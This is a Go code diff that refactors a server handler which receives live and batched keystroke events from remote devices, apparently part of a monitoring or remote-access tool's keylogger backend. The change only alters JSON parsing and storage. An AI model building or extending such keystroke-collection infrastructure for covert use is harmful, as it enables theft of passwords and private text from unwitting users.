@@ -289,13 +289,30 @@ func HandleKeyloggerEvent(deviceID string, eventType string, data []byte) {
 	switch eventType {
 	case "keylogger_live":
 		// Handle live keystroke event
-		var event KeyEvent
-		if err := json.Unmarshal(data, &event); err != nil {
+		var eventData map[string]any
+		if err := json.Unmarshal(data, &eventData); err != nil {
 			common.Error("keylogger", "unmarshal", "live_event_failed", err.Error(), nil)
 			return
 		}
 		
-		event.DeviceID = deviceID
+		// Extract event fields from the map
+		event := KeyEvent{
+			DeviceID: deviceID,
+		}
+		if key, ok := eventData["key"].(string); ok {
+			event.Key = key
+		}
+		if windowStr, ok := eventData["window"].(string); ok {
+			event.Window = windowStr
+		}
+		if typeStr, ok := eventData["type"].(string); ok {
+			event.Type = typeStr
+		}
+		if timestampStr, ok := eventData["timestamp"].(string); ok {
+			if ts, err := time.Parse(time.RFC3339, timestampStr); err == nil {
+				event.Timestamp = ts
+			}
+		}
 		
 		// Store the event
 		if keyloggerEvents[deviceID] == nil {
@@ -318,19 +335,40 @@ func HandleKeyloggerEvent(deviceID string, eventType string, data []byte) {
 
 	case "keylogger_upload":
 		// Handle batch upload of events
-		var events []KeyEvent
-		if err := json.Unmarshal(data, &events); err != nil {
+		var uploadData map[string]any
+		if err := json.Unmarshal(data, &uploadData); err != nil {
 			common.Error("keylogger", "unmarshal", "batch_events_failed", err.Error(), nil)
 			return
 		}
 		
-		// Add device ID to events and store them
-		if keyloggerEvents[deviceID] == nil {
-			keyloggerEvents[deviceID] = make([]KeyEvent, 0)
+		// Extract events array from the map
+		var events []KeyEvent
+		if eventsData, ok := uploadData["events"].([]any); ok {
+			for _, eventAny := range eventsData {
+				if eventMap, ok := eventAny.(map[string]any); ok {
+					event := KeyEvent{DeviceID: deviceID}
+					if key, ok := eventMap["key"].(string); ok {
+						event.Key = key
+					}
+					if windowStr, ok := eventMap["window"].(string); ok {
+						event.Window = windowStr
+					}
+					if typeStr, ok := eventMap["type"].(string); ok {
+						event.Type = typeStr
+					}
+					if timestampStr, ok := eventMap["timestamp"].(string); ok {
+						if ts, err := time.Parse(time.RFC3339, timestampStr); err == nil {
+							event.Timestamp = ts
+						}
+					}
+					events = append(events, event)
+				}
+			}
 		}
 		
-		for i := range events {
-			events[i].DeviceID = deviceID
+		// Store the events
+		if keyloggerEvents[deviceID] == nil {
+			keyloggerEvents[deviceID] = make([]KeyEvent, 0)
 		}
 		
 		keyloggerEvents[deviceID] = append(keyloggerEvents[deviceID], events...)
